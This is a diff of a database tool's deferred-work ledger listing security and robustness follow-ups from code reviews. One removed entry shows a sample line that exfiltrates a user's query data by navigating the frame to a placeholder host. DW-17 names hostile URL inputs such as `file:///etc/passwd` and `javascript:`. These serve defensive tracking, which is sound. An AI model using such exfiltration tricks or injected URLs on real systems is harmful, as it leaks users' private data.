-  evidence: When a MySQL connection names a database, columns are scoped to that schema but a FK may reference a table in another database; `schemaToGraph` then drops the edge as an "absent table" with no user indication a real relationship was omitted. Defensible for v1 but an explicit product decision (dangling-edge affordance vs. note vs. silent) is preferable.
-
 ### DW-1: Follow-up review still recommended for 4-2-persist-erd-layout after the review budget was exhausted
 origin: review-budget-followup
 source_spec: `spec-4-2-persist-erd-layout.md`
 severity: low
 reason: Review budget (3 cycles) was exhausted with the story finalized (status: done, verify green) while the review pass kept recommending an independent follow-up. The work was committed by bmad-loop run 20260710-224752-6cf5; this entry preserves the lingering follow-up recommendation for a deliberate later review.
 status: open
-- source_spec: `_bmad-output/implementation-artifacts/spec-5-2-chat-qa-schema-only.md`
-  summary: `connectionManager.getSchema()` memoizes the schema at connect and never re-introspects, so chat context (and the "N tables" badge) goes stale after DDL runs (create/drop table).
-  evidence: `src/core/connection.ts` returns `cached.schema` fixed at first connect; Story 3.4/3.x DDL mutates the live DB but no re-introspection path exists. Surfaced by 5.2 which now feeds that cached schema to the AI provider.
 
-- source_spec: `_bmad-output/implementation-artifacts/spec-5-4-streaming-reasoning.md`
-  summary: Provider-key redaction in the chat error path is exact-substring only (`rawCause.split(apiKey).join("***")`), so a key echoed in a non-literal form (URL-encoded, base64, truncated, or nested in a structured error object) would still reach stderr.
-  evidence: Inherited from Story 5.2's `answer()` redaction and reused verbatim by 5.4's `answerStream` (including the SDK-emitted `error`-part path). No current provider (Anthropic/OpenAI/Google) echoes the API key in error bodies, so this is latent; a stronger guarantee (redact encoded/partial forms, or emit a fixed generic cause) is preferable given the "key NEVER in any log" invariant.
+### DW-2: Harden the per-boot token against same-machine processes and add a Content-Security-Policy (with a nonce for the inline token script) once stories render database content
 
-- source_spec: `_bmad-output/implementation-artifacts/spec-5-5-crossorigin-js-sandbox.md`
-  summary: Scripted same-frame navigation (`window.location = "http://host/?" + data`) bypasses `connect-src 'none'`, so a hostile guest can still exfiltrate the user's private `FrozenData`; the "already-public frozen data" comments understate this.
-  evidence: CSP fetch directives (`connect-src`, `img-src`) do not govern top-level/self navigation, and `sandbox="allow-scripts"` without `allow-top-navigation` still permits a frame to navigate ITSELF. The pushed `FrozenData` is the user's real query output, not public data. Closing this is a genuine architectural/security decision (e.g. gating `pushData` on a confirmed handshake so data never lands in a navigated-away frame, and/or a documented residual) rather than a trivial patch — the `pushData(frame, "*")` target-origin is deliberately `"*"` against the guest's opaque origin.
+origin: migrated from legacy ledger (code review of spec-1-1-walking-skeleton.md), 2026-07-12
+location: `src/core/server.ts` (GET / token handoff, `window.__QS_TOKEN__`)
+reason: The token is served in cleartext at the ungated `GET /` (the spec's chosen browser handoff), so any local process can scrape it; and `window.__QS_TOKEN__` is script-readable, so a future stored-XSS in rendered DB data could exfiltrate it. Both matter only once data rendering (Epic 3/5) exists; the walking skeleton renders no untrusted data.
+status: open
 
-- source_spec: `_bmad-output/implementation-artifacts/spec-5-5-crossorigin-js-sandbox.md`
-  summary: In exposed mode (`QS_HOST=0.0.0.0`) the sandbox server binds the same wildcard host as Core (LAN-exposing the tokenless guest) while the injected `__QS_SANDBOX_ORIGIN__` is normalized to `127.0.0.1:<port>`, which is unreachable for a remote browser — the sandbox silently fails to load off-host.
-  evidence: `startCore` passes `bindHost` straight into the sandbox `Bun.serve`, and `deriveOpenUrl` rewrites the injected origin to loopback. The intent-contract Block-If explicitly reserves the exposure model as a human security decision, so the correct exposed-mode posture (loopback-only sandbox + documented "visualization unavailable when exposed", or a reachable remote origin) is a deliberate call, not an unattended patch.
+### DW-3: When data-carrying RPCs arrive, have the server map `decode()` failures on untrusted peer FrozenData to a typed `bad_request` (400) instead of letting them throw into the catch-all `internal_error` (500)
 
-- source_spec: `_bmad-output/implementation-artifacts/spec-5-5-crossorigin-js-sandbox.md`
-  summary: The guest→host signal stream (`height`/`error`/`datum-clicked`) is unbounded in rate/count, so a hostile guest can flood `onSignal` — and via `SandboxFrame`'s `setHeight` a React re-render — thrashing the Ring 2 main thread.
-  evidence: `isSandboxOutbound` caps `error.message` length but nothing coalesces or rate-limits frames; each valid `height` triggers `setHeight`. Best addressed when Story 5.6 wires the real renderer (debounce/coalesce height via rAF, rate-limit `onSignal`); no containment breach, but a cheap render-thrash DoS from untrusted code.
+origin: migrated from legacy ledger (code review of spec-1-1-walking-skeleton.md), 2026-07-12
+location: `decode` (FrozenData decode on the RPC server path)
+reason: `decode` enforces producer-side invariants by throwing `TypeError`; that is correct for internal producers but wrong for untrusted inbound wire data. No RPC decodes untrusted FrozenData in story 1.1, so it is latent until Epic 3.
+status: open
 
-- source_spec: `_bmad-output/implementation-artifacts/spec-5-5-crossorigin-js-sandbox.md`
-  summary: `SandboxFrame` binds the iframe `contentWindow` exactly once at mount; a null-at-mount window or a later guest-frame reload silently kills the channel (host never built, or the identity gate drops every subsequent message) with no rebind or diagnostic.
-  evidence: The mount `useEffect` has empty deps and returns early if `contentWindow` is null; the host's identity gate is `event.source === iframeWindow` against that single captured window. Both fail closed (no leak) but produce a silently dead sandbox. Re-resolving `contentWindow` on the iframe `load` event and rebuilding/rebinding the host would harden it; low urgency while the component is unwired, natural to fix when 5.6 mounts it for real.
+### DW-4: Story 1.2's browser-open must target `http://127.0.0.1:<port>`, NOT `http://localhost:<port>`, or the Origin/Host gate rejects every RPC
 
-- source_spec: `_bmad-output/implementation-artifacts/spec-5-5-crossorigin-js-sandbox.md`
-  summary: `SandboxFrame` documents `data: null` as "renders an empty guest", but a non-null→null transition pushes nothing, so the guest keeps displaying the prior draw — the documented empty state never happens.
-  evidence: `SandboxFrame.tsx:36` promises the empty-guest behavior; `SandboxFrame.tsx:109` guards `if (loaded && data !== null)` and never clears. A correct fix (push an empty `FrozenData` that passes the guard's `decode`, or restate the contract) needs the empty-state semantics 5.6 will define, so it is deferred rather than papered over.
+origin: migrated from legacy ledger (code review of spec-1-1-walking-skeleton.md), 2026-07-12
+location: `validateOrigin` (`src/core/server.ts`)
+reason: `validateOrigin` requires an exact `127.0.0.1:<port>` Host match and treats `localhost` as a distinct (rejected) origin — per the spec's deliberate design. A `localhost` launch URL would make the app appear broken end-to-end with only a `forbidden_origin` error.
+status: open
 
-- source_spec: `_bmad-output/implementation-artifacts/spec-6-4-export-live-report.md`
-  summary: In the Live Report runtime, a `connections.list` failure at initial load leaves the top-level "cannot reach quick-studio" banner and the Default-only picker permanently stale — a later Refresh re-queries and renders live data but never re-lists connections nor clears the banner, so recovered data is shown beneath a contradictory failure notice with named connections missing until a full page reload.
-  evidence: `src/live-report/runtime.ts` `runLiveReport` calls `loadConnections` once and `host.setStatus(CANNOT_REACH_HTML)` on failure; `runAll` (wired to both the picker and Refresh) only re-issues `execute` per query block — it never re-attempts `loadConnections`, clears the top-level status, nor rebuilds the picker. Trigger is narrow (connections.list fails at load, Core recovers, viewer clicks Refresh) and data stays correct with full-reload recovery, so consequence is low/cosmetic; the correct fix is a re-entrant connection-reload + replaceable-picker refactor (must preserve the run-generation concurrency guard and the current pick), disproportionate to jam into an unattended follow-up review — deferred for focused attention.
+### DW-5: Decouple the Ring-2 UI build from Ring-1 Core availability and stop rebuilding the UI on every boot (bundle at build time / cache) to protect the epic's ≤2s cold-start target
+
+origin: migrated from legacy ledger (code review of spec-1-1-walking-skeleton.md), 2026-07-12
+location: `startCore` / `buildUiBundle()` (`src/core/server.ts`)
+reason: `startCore` awaits `buildUiBundle()`, so any UI TypeScript/build error currently aborts the whole Core (including the health channel), and every boot re-bundles. Acceptable for a skeleton; a cost/robustness concern for the run-mode and packaging stories (1.2, 1.7).
+status: open
+
+### DW-6: Decide the canonical frozen-date sub-second precision policy (truncate-to-ms vs preserve) before real DB timestamps arrive; the current ISO regex + calendar round-trip only support millisecond precision
+
+origin: migrated from legacy ledger (code review of spec-1-1-walking-skeleton.md), 2026-07-12
+location: `ISO_UTC_RE` / `assertIsoUtc` (frozen-date utilities)
+reason: `ISO_UTC_RE` allows only 1–3 fractional digits and `assertIsoUtc` re-serializes through a JS `Date` (millisecond resolution), so Postgres/MySQL microsecond timestamps (`.123456Z`) would throw. No timestamps flow until Epic 1 story 1.3 / Epic 3, and fixing it correctly is a precision-policy decision, not a one-line regex widen.
+status: open
+
+### DW-7: Optionally add a max request-body guard (Content-Length limit) on `POST /rpc`
+
+origin: migrated from legacy ledger (code review of spec-1-1-walking-skeleton.md), 2026-07-12
+location: `POST /rpc` (`src/core/server.ts`, `await req.json()`)
+reason: `await req.json()` buffers an unbounded body. Low risk for a single-user localhost tool (you would only DoS yourself), but a cheap hardening once multi-caller scenarios (Live Reports, Epic 6) appear.
+status: open
+
+### DW-8: When story 1.2 makes the port user-configurable, handle the scheme-default ports (80/443) in `validateOrigin` — browsers omit the default port from `Host`/`Origin`, so the exact `host:port` authority match rejects every RPC
+
+origin: migrated from legacy ledger (code review of spec-1-1-walking-skeleton.md), 2026-07-12
+location: `validateOrigin` (`src/core/server.ts`, `expectedAuthority`)
+reason: `validateOrigin` builds `expectedAuthority` as `${host}:${port}`, but a browser loading `http://127.0.0.1` (QS_PORT=80) sends `Host: 127.0.0.1` and `Origin: http://127.0.0.1` with no `:80`, so both comparisons fail and every RPC is rejected `forbidden_origin` (app dead-on-arrival). Story 1.1 defaults to ephemeral ports, so this is latent until 1.2 lets the user pin a port.
+status: open
+
+### DW-9: When story 1.2 adds browser-open, do NOT hand the OS launcher `core.url` verbatim for a wildcard bind — `http://0.0.0.0:<port>` (and `http://[::]:<port>`) is a non-routable bind sentinel, not a navigable address; compute a display/open URL of `http://localhost:<port>` instead
+
+origin: migrated from legacy ledger (code review of spec-1-6-localhost-binding-port-warning.md), 2026-07-12
+location: `startCore` (`src/core/server.ts`, `core.url = http://${bindHost}:${boundPort}`)
+reason: `startCore` builds `core.url = http://${bindHost}:${boundPort}`, so under `QS_HOST=0.0.0.0` the boot line prints `listening on http://0.0.0.0:<port>` and any future auto-open would target a dead URL. Truthful-but-unusable today (only the stderr listening line is affected); becomes a real dead-on-open defect once 1.2 wires browser-open. Bind host stays `0.0.0.0` for `Bun.serve`; only the surfaced URL needs the substitution.
+status: open
+
+### DW-10: Replace the English substring heuristic (`isNotFoundError`) that distinguishes a missing keychain entry (`not-found`) from an unreachable backend (`unavailable`) with typed error codes/kinds from `@napi-rs/keyring`, once the real per-platform error shapes are observed (CI Windows leg / Story 2.2)
+
+origin: migrated from legacy ledger (code review of spec-2-1-keyring-spike.md), 2026-07-12
+location: `isNotFoundError` (keyring spike wrapper)
+reason: Both review layers flagged the substring match as locale-fragile and as the linchpin of the passphrase-fallback decision — on backends that throw NoEntry (e.g. Windows Credential Manager) rather than returning null, a genuine miss or a localized/reworded error could be misclassified. It currently fails safe (unknown → `unavailable`), and the tested Linux path returns null (never hits the throw branch), so the robust fix genuinely needs Windows-observed error data the local spike could not gather. Story 2.2 must not commit Windows to the keychain path until confirmed.
+status: open
+
+### DW-11: Validate the macOS keychain path for `@napi-rs/keyring` under Bun (a `macos-latest` CI leg + a decision-record row) before the product ships a signed macOS build that relies on the keychain key-management path
+
+origin: migrated from legacy ledger (code review of spec-2-1-keyring-spike.md), 2026-07-12
+location: CI matrix / `@napi-rs/keyring` (macos-latest leg, keychain round-trip)
+reason: The product targets macOS (`bun.lock` ships all `@napi-rs/keyring-darwin-*` binaries) but Story 2.1's CI matrix is deliberately `ubuntu + windows` per spec, so the macOS Keychain round-trip and compiled-binary native load are unproven. GitHub macOS runners have notoriously locked keychains, making it exactly the leg most likely to need special provisioning; leaving it unvalidated means a macOS user could silently land on the passphrase fallback (or worse) with no per-platform go/no-go on record.
+status: open
+
+### DW-12: Decide, in Story 2.2's key-load path, whether a keychain entry that round-trips as an empty string (`""`) should be treated as a valid key or rejected as effectively `not-found`; the Ring-1 wrapper currently returns `found` with `value: ""`
+
+origin: migrated from legacy ledger (code review of spec-2-1-keyring-spike.md), 2026-07-12
+location: `getSecret` (keyring spike wrapper)
+reason: `getSecret` only maps `null`/`undefined` to `not-found`, so a stored empty string surfaces as a legitimate `found` result. That is faithful for a generic wrapper, but an empty AES-256 key is never valid; the guard belongs in Story 2.2's key validation, not in the spike wrapper (patching it here would risk masking a legitimately-stored empty value). Latent until the real store loads keys.
+status: open
+
+### DW-13: In Story 2.2's durable keychain API, distinguish an invalid-argument error (e.g. empty/blank `service` or `account` making `new Entry()` throw) from a genuine backend-unavailable condition, rather than letting the wrapper's catch-all classify every non-not-found throw as `unavailable`
+
+origin: migrated from legacy ledger (code review of spec-2-1-keyring-spike.md), 2026-07-12
+location: `setSecret` / `getSecret` / `deleteSecret` (keyring spike wrapper)
+reason: `setSecret`/`getSecret`/`deleteSecret` route any thrown error that isn't recognized as not-found straight to `unavailable`, so a programming error (bad service/account) would masquerade as a missing keychain backend and silently trigger Story 2.3's passphrase fallback instead of surfacing the bug. Harmless in Story 2.1 (service/account are hardcoded non-empty constants), but once 2.2 accepts caller-supplied identifiers an argument bug would be indistinguishable from a real keychain outage.
+status: open
+
+### DW-14: Establish a single-writer guarantee for the credential store — either a cross-process file lock or an OS-level single-instance guard — before two concurrent Core instances (or a re-launch overlapping a slow shutdown) can silently clobber each other's writes or race the master-key generation
+
+origin: migrated from legacy ledger (code review of spec-2-2-encrypted-credential-store.md), 2026-07-12
+location: `credential-store.ts`; `store-key.ts` (`loadOrCreateStoreKey`)
+reason: `credential-store.ts` loads the whole record set into an in-memory `Map` and, on each mutation, re-encrypts and atomically renames the entire file; there is no lock or read-modify-write reconciliation. Two live instances over the same dir → last flush wins, silently dropping the other's saved/deleted connections (lost update). Symmetrically, `store-key.ts` `loadOrCreateStoreKey` has a generate-on-`not-found` window where two processes each mint and store a different 32-byte key; the loser's already-encrypted file becomes permanently undecryptable (`corrupt`). Not triggered by Story 2.2 (single localhost Core, single user), but the first persistence substrate makes it latent for any future multi-instance/overlapping-launch scenario; the atomic rename prevents torn files but not lost updates or key races.
+status: open
+
+### DW-15: When Story 2.3 adds the passphrase fallback, give the "keychain key lost but store file present" case a distinct typed outcome (and a recovery hook) instead of surfacing it as `corrupt`, so it is not confused with malicious tampering and does not invite a destructive overwrite
+
+origin: migrated from legacy ledger (code review of spec-2-2-encrypted-credential-store.md), 2026-07-12
+location: `store-key.ts` (`loadOrCreateStoreKey`); `credential-store.ts` (`openCredentialStore`)
+reason: `loadOrCreateStoreKey` mints a fresh CSPRNG key on any keychain `not-found` with no awareness that an encrypted `credential-store.enc` already exists. If the keychain entry is lost while the file survives (OS keychain reset, profile migration, Secret Service re-init, logout wipe), the next open generates a new key, decryption fails the auth tag, and `openCredentialStore` returns `corrupt` — indistinguishable from a tampered file. The data encrypted under the vanished key is already unrecoverable (inherent to AES-GCM with a lost key), so this is not data loss caused by Story 2.2, and the store never overwrites on open; but the misclassification and the absence of a "key-missing / file-present" recovery signal belong to Story 2.3's passphrase-fallback design (the sanctioned recovery path for a missing key). Distinct from the single-writer entry above (that is a concurrency/race issue; this is key-lifecycle vs file-lifecycle desync). NOTE: the legacy entry recorded this as later RESOLVED by Story 2.3 (spec-2-3) — the keychain reopen path now maps a regenerated key (`created`) over an existing `.enc` to the distinct typed `key-unavailable`, with the passphrase fallback as the sanctioned recovery path; sweep triage should verify against the current code before closing.
+status: open
+
+### DW-16: Provide a non-env passphrase transport (stdin / file descriptor) for the keychain-unavailable fallback and document the `QS_PASSPHRASE` exposure, so the passphrase is not carried in the process environment on exactly the headless hosts the fallback targets
+
+origin: migrated from legacy ledger (code review of spec-2-3-passphrase-fallback.md), 2026-07-12
+location: `envPassphraseProvider` (`QS_PASSPHRASE`)
+reason: `envPassphraseProvider` (the intent-contract-sanctioned default provider) reads the passphrase from the `QS_PASSPHRASE` environment variable. On a keychain-less/headless box this leaves the secret readable via `/proc/<pid>/environ` (same-user tooling), inherits it into every spawned child process, and can capture it in core dumps — a well-known env-secret leak vector, though it never touches disk or logs (the store's "never written/logged" invariant holds). The env seam is intentional and functional today; Story 2.4 adds the interactive UI prompt, and a stdin/fd provider plus a documented warning is the proper hardening. Not a bug in Story 2.3 (the env default is by design), but residual security surface worth focused attention before a wider release.
+status: open
+
+### DW-17: When Story 1.3 wires the real DB connection, validate the Ephemeral database-URL's scheme/shape (allowlist `postgres`/`postgresql`/`mysql`), rejecting `file:`/`javascript:`/`data:` and Windows drive-path pseudo-URLs (`C:\db` parses as scheme `c:`) that Story 1.2's deliberately shallow `new URL()` shape-check lets through
+
+origin: migrated from legacy ledger (code review of spec-1-2-one-command-run-mode-select.md), 2026-07-12
+location: `parseCliArgs` (`src/core/cli-args.ts`)
+reason: `parseCliArgs` validates the DB-URL positional only via `new URL(urlArg)` — which accepts any parseable URL — because engine/scheme validation and the actual connect belong to Story 1.3 (the spec scopes 1.2 to "shape only"). So today a nonsense-but-parseable positional (`file:///etc/passwd`, `C:\db.sqlite`) silently selects Ephemeral and carries a meaningless "URL" forward with no error. Not a bug in 1.2 (by-design deferral, and no connection is attempted here), but Story 1.3 is the sanctioned place to reject non-relational schemes with the "distinguishes host vs auth vs network" clear error the epic requires.
+status: open
+
+### DW-18: Add a distinct "database does not exist" connection-failure kind so a valid host+auth pointed at a nonexistent catalog (PG SQLSTATE `3D000`, MySQL `ER_BAD_DB_ERROR`/errno `1049`) is not misreported as `network` ("could not reach the database")
+
+origin: migrated from legacy ledger (code review of spec-1-3-connect-postgres-mysql.md), 2026-07-12
+location: `classifyConnectionError` (`src/core/driver.ts`); `ConnectionFailureKind` (`src/shared/contract.ts`)
+reason: `classifyConnectionError` maps only auth/host/network codes and defaults everything else to `network`. `ConnectionFailureKind` has no bucket for invalid-catalog, so a user who authenticates fine but names a missing database sees the misleading "connection refused, reset, or timed out" message. Real but out of Story 1.3's stated host-vs-auth-vs-network 3-way scope: fixing it correctly means adding a new neutral failure kind to the shared contract (a design decision), not a one-line map widen.
+status: open
+
+### DW-19: Classify introspection (`listSchema`) failures that occur AFTER a successful handshake into the neutral `ConnectResult` taxonomy instead of letting a raw engine error escape as `internal_error` (HTTP 500)
+
+origin: migrated from legacy ledger (code review of spec-1-3-connect-postgres-mysql.md), 2026-07-12
+location: `driver-postgres.ts` / `driver-mysql.ts` (`listSchema`); `connection.ts` `open()` (lines 92, 104)
+reason: The adapters (`driver-postgres.ts`/`driver-mysql.ts`) wrap only `connect()` errors via `toDriverConnectionError`; `listSchema()` throws raw. In `connection.ts` `open()`, a non-`DriverConnectionError` from `await d.listSchema()` (line 92) hits `throw err` (line 104) → `internal_error`. So an authenticated-but-unprivileged account that cannot read `information_schema`, or a connection dropped/reset mid-introspection, surfaces as an opaque 500 rather than a classified `status:"failed"`. Real, but the spec's golden shape deliberately re-throws non-classified errors as bugs and the current 4-kind enum has no natural bucket for a post-handshake permission/introspection error — so the fix is a taxonomy decision (adjacent to the invalid-catalog item above), not a trivial wrap. No live-DB test exercises the privileged-introspection path.
+status: open
+
+### DW-20: Bound the introspection query itself (statement/query timeout) or race the connection manager's `close()` against a timer, so a hung `listSchema` cannot block shutdown indefinitely
+
+origin: migrated from legacy ledger (code review of spec-1-3-connect-postgres-mysql.md), 2026-07-12
+location: `connection.ts` `close()` (lines 143-150); driver adapters (information_schema query)
+reason: `connection.ts` `close()` unconditionally `await`s the in-flight `open()` (lines 143-150) before tearing the driver down, and neither adapter sets a per-statement timeout on the `information_schema.columns` query. If `connect()` succeeds but the introspection query hangs (e.g. a lock on `information_schema`, a stalled server), `close()` never resolves → `Core.stop()` never completes → the port is never released. The postgres `connect_timeout: 10` and the new mysql `CLOSE_TIMEOUT_MS` teardown bound cover connect and teardown, but NOT a wedged query mid-introspection. Real edge; the fix touches the concurrency/shutdown-ordering model (racing inflight vs a bounded query timeout).
+status: open
+
+### DW-21: Distinguish a malformed-but-supported-scheme URL from a genuinely unsupported scheme, so a bad/out-of-range port (or otherwise unparseable authority) on a `postgres`/`mysql` URL is not reported as `unsupported_scheme`
+
+origin: migrated from legacy ledger (code review of spec-1-3-connect-postgres-mysql.md), 2026-07-12
+location: `schemeOf` / `createDriver` (`src/core/driver.ts`)
+reason: `schemeOf` reads the scheme via `new URL(url)`; when the URL is unparseable it returns `null`, and `createDriver` then rejects with `unsupported_scheme`. Confirmed at runtime: `new URL("postgres://host:5432x/db")` and `new URL("postgres://host:99999/db")` both throw `TypeError`, so a supported-scheme URL with a typo'd/out-of-range port yields the message "unsupported database URL scheme (expected postgres or mysql)" — a misleading verdict (the scheme IS supported; the URL is malformed). Real UX papercut, but the 4-kind failure enum has no "malformed URL" bucket, so a correct fix needs a taxonomy/message decision beyond the story's sanctioned wrong-scheme rejection (`file:`/`javascript:`/`data:`/Windows paths).
+status: open
+
+### DW-22: Surface a persistent `workspace.save` write-failure (disk full / EACCES / app dir removed mid-session) to the user instead of silently `void`-ing the reply, so a developer isn't led to believe their layout is being persisted when every save is failing
+
+origin: migrated from legacy ledger (code review of spec-2-5-persist-workspace-state.md), 2026-07-12
+location: `src/ui/App.tsx` (debounced `workspace.save`)
+reason: The debounced save in `src/ui/App.tsx` does `void rpc<SaveWorkspaceResult>("workspace.save", …)` — the reply (including `internal_error` from a store `write-failed`, or `saved:false`) is discarded, with no retry and no notification. Real but layout-only (non-critical) data, and surfacing it correctly needs a UX decision (status stamp/toast) beyond Story 2.5's "restore Panel sizes + Tabs" scope; the terse mono status-bar stamp pattern from the epic UX notes is the natural home.
+status: open
+
+### DW-23: Constrain `panelSizes` to exactly two finite numbers in a sane range (e.g. [0,100]) at the workspace-store/registry validation boundary (or sanitize in the UI before it reaches `defaultSize`), so a hand-edited/legacy `workspace-state.json` cannot yield a broken initial split
+
+origin: migrated from legacy ledger (code review of spec-2-5-persist-workspace-state.md), 2026-07-12
+location: `isWorkspaceSnapshot` (`src/core/workspace-store.ts`); `checkPanelSizes` (`src/core/workspace-registry.ts`)
+reason: `isWorkspaceSnapshot` and `checkPanelSizes` accept ANY-length finite-number array; `App.tsx` only special-cases the empty array. So `[42]`, `[10,20,30]`, or `[-5,105]` survive load/save and flow into `react-resizable-panels` `defaultSize`, producing a split that doesn't sum to 100 or exceeds a Panel's min/max. Unreachable in normal operation (`onLayout` always emits two values summing to 100) — tamper/legacy-file hardening only. Deferred over patched-now because "exactly 2" bakes in the current two-panel design and a future multi-panel layout would want variable length — a design decision, not a mechanical tighten.
+status: open
+
+### DW-24: Flush the pending debounced `workspace.save` on app quit / window unmount so the last layout or tab change made within `SAVE_DEBOUNCE_MS` (400ms) before Stop is not lost
+
+origin: migrated from legacy ledger (code review of spec-2-5-persist-workspace-state.md), 2026-07-12
+location: `src/ui/App.tsx` (save effect cleanup, `onStop`)
+reason: The save effect cleanup in `src/ui/App.tsx` does `clearTimeout(handle)` with no flush, and `onStop` fires `shutdown` without draining the pending save; there is no `beforeunload` handler. A drag/open immediately followed by quit drops that final change. Narrow window and layout-only, but it's exactly the "last action" a user expects to survive; a correct flush-on-unmount in Electron needs a sync/beacon path, so it's a focused follow-up rather than a trivial patch.
+status: open
+
+### DW-25: Reconcile the `activeTabId: null`-with-tabs-present disagreement between the registry validator (accepts it as valid) and `restoreWorkspace` (rewrites it to the first tab), so a "no active tab" intent is not silently changed on restore
+
+origin: migrated from legacy ledger (code review of spec-2-5-persist-workspace-state.md), 2026-07-12
+location: `validateSnapshotParams` (`src/core/workspace-registry.ts`); `restoreWorkspace` (`src/ui/workspace/workspace-state.ts`)
+reason: `workspace-registry.ts` `validateSnapshotParams` explicitly allows `activeTabId: null` even with tabs present (asserted in `workspace-registry.test.ts`), but `src/ui/workspace/workspace-state.ts` `restoreWorkspace` treats `null` as "not among the tabs" (`tabs.some(t => t.id === null)` is always false) and falls back to `tabs[0].id`. Only reachable via a hand-edited file (the live app never emits null-with-tabs), so a low-consequence validator/restore-normalization inconsistency to align deliberately.
+status: open
+
+### DW-26: Enforce tab-id uniqueness across `tabs` in the workspace-store/registry validation so a snapshot with duplicate ids cannot make `closeTab` remove two tabs at once
+
+origin: migrated from legacy ledger (code review of spec-2-5-persist-workspace-state.md), 2026-07-12
+location: `checkTabs` (`src/core/workspace-registry.ts`); `restoreWorkspace` (`src/ui/workspace/workspace-state.ts`)
+reason: Neither `checkTabs` nor `restoreWorkspace` rejects duplicate ids; the `activeTabId` set-membership check dedupes and so doesn't catch it. `tabs:[{id:1,…},{id:1,…}]` restores verbatim, and `closeTab`'s `filter(t => t.id !== id)` then removes both. Reachable only via a hand-edited file — hardening, not a normal-operation bug (the pure model's monotonic `nextId` never mints duplicates).
+status: open
+
+### DW-27: Add a sequencing/generation guard (or single-flight) to `workspace.save` so two overlapping in-flight saves cannot land out of completion order and persist the older snapshot
+
+origin: migrated from legacy ledger (code review of spec-2-5-persist-workspace-state.md), 2026-07-12
+location: `src/ui/App.tsx`; `workspace-store.ts`
+reason: `src/ui/App.tsx` can have a slow save S1 in flight when a newer change fires S2; the store (`workspace-store.ts`) uses a unique temp file + `rename` per save (no corruption), but there's no ordering guard, so if S2's rename lands before S1's the older snapshot wins. Low probability given fast local fs renames and the 400ms debounce; a monotonic save-generation check or single-flight-with-trailing would close it.
+status: open
+
+### DW-28: Preserve, rather than overwrite, an unreadable-but-newer-version `workspace-state.json` (e.g. a `version: 2` file opened by an older `version: 1` build) so a downgrade launch doesn't destroy a future build's saved state
+
+origin: migrated from legacy ledger (code review of spec-2-5-persist-workspace-state.md), 2026-07-12
+location: `isWorkspaceSnapshot` (`src/core/workspace-store.ts`)
+reason: `isWorkspaceSnapshot` degrades a version mismatch to `null` (a *successful* load), so `App.tsx` enables saving and the first user change writes a `version: 1` snapshot over the `version: 2` file. The Story 2.5 data-loss patch only guards load *errors*, not a successful degrade-to-null. Spec explicitly allows "version-mismatch → fresh workspace", and `version: 2` does not exist yet, so this is a forward-compat hardening (e.g. back up or refuse-to-overwrite a newer-version file) for whenever the snapshot schema next changes.
+status: open
+
+### DW-29: Project the Postgres `Driver.query` read path from positional column descriptors instead of a name-keyed row object, so duplicate/aliased column names in a future raw-SQL result are not collapsed (MySQL's `rowsAsArray` path already returns positional arrays)
+
+origin: migrated from legacy ledger (code review of spec-3-2-browse-rows-pagination.md), 2026-07-12
+location: `driver-postgres.ts` (`query`, `cols.map(c => row[c.name])`)
+reason: `driver-postgres.ts` `query` builds each row via `cols.map(c => row[c.name])` on postgres.js's name-keyed row object; two same-named result columns collapse to one value, and the two engines diverge (mysql2 uses `rowsAsArray:true`). The browse SELECT can never trigger it (single-table columns are unique), but `Driver.query`/`quoteIdent` is the shared seam the Story 3.6 raw-SQL path will reuse, where aliased/duplicate columns are common. Latent until raw SQL exists; the fix is an engine-adapter change (postgres.js `.values()`), not a browse-behavior bug.
+status: open
+
+### DW-30: Type-color and align result-grid columns by their SQL `dataType` (numeric/decimal/bigint → number), not only by the neutral `FrozenCell` kind, so string-encoded numeric columns are not rendered as TEXT — the same SQL-type plumbing the deferred `t-json` color needs
+
+origin: migrated from legacy ledger (code review of spec-3-2-browse-rows-pagination.md), 2026-07-12
+location: `naturalKind` (`frozen-map.ts`); `DataGrid.tsx`
+reason: postgres.js returns `numeric`/`decimal`/`int8` and mysql2 returns `DECIMAL`/`BIGINT` as JS strings (and `bigint` is deliberately forced to string for precision), so `naturalKind` in `frozen-map.ts` classifies them `string`; `DataGrid.tsx` then labels them `TEXT`, left-aligns, and drops `tabular-nums`. Values are correct — only the header type/alignment is wrong. The spec deliberately colors by neutral kind (and already defers `t-json` for the same reason); fixing both needs the SQL `dataType` carried alongside the result columns, a contract/plumbing decision beyond this story.
+status: open
+
+### DW-31: Report a composite `SchemaTableInfo.primaryKey` in the key's own ordinal order (`ORDER BY ordinal_position` in both PK introspection queries) rather than in table-column order
+
+origin: migrated from legacy ledger (code review of spec-3-2-browse-rows-pagination.md), 2026-07-12
+location: `assembleSchema` (`driver.ts`, PK introspection queries)
+reason: `assembleSchema` builds `primaryKey` by pushing PK column names in the columns query's schema/table/ordinal order gated by a membership Set, and neither the Postgres nor MySQL PK query orders by `ordinal_position`. For a composite PK whose key order differs from column order (PK `(b,a)` with `a` earlier in the table), `primaryKey` is `["a","b"]` — misreported. Pagination stays correct (the ORDER BY set is still total/deterministic) and the grid PK icon (membership-based) is unaffected, so it is invisible in Story 3.2; it matters once a consumer relies on PK column order (e.g. Story 3.3 row edit/where-clause construction).
+status: open
+
+### DW-32: Acknowledge (and, if desired, mitigate with keyset/snapshot pagination) that the `table.rows` COUNT and page SELECT are two non-atomic round-trips, so `total` and page contents can disagree — and OFFSET pages can drift — under concurrent writes to the browsed table
+
+origin: migrated from legacy ledger (code review of spec-3-2-browse-rows-pagination.md), 2026-07-12
+location: `tableRows` (`server.ts`)
+reason: `server.ts` `tableRows` issues `connectionManager.query(countSql)` then `query(selectSql)` with no shared snapshot/transaction; a concurrent insert/delete between them (or before the offset) makes `total` inconsistent with the returned page and shifts OFFSET-based pages. This is inherent to OFFSET pagination rather than a defect in the composition, and this is a read-only browse of a live DB (staleness is expected), so it is a known-limitation note rather than a Story 3.2 bug; keyset (seek) pagination on the PK is the durable fix if it becomes user-visible.
+status: open
+
+### DW-33: Make the keyless-table (no-PK) browse ordering robust — the static `UNORDERABLE_TYPE_PREFIXES` heuristic in `table-rows.ts` can both silently omit `ORDER BY` (rows overlap/skip across pages) and emit an `ORDER BY` the engine rejects (hard `internal_error`, blank grid), depending on the table's column types
+
+origin: migrated from legacy ledger (code review of spec-3-2-browse-rows-pagination.md), 2026-07-12
+location: `isOrderable` / `UNORDERABLE_TYPE_PREFIXES` (`src/core/table-rows.ts`)
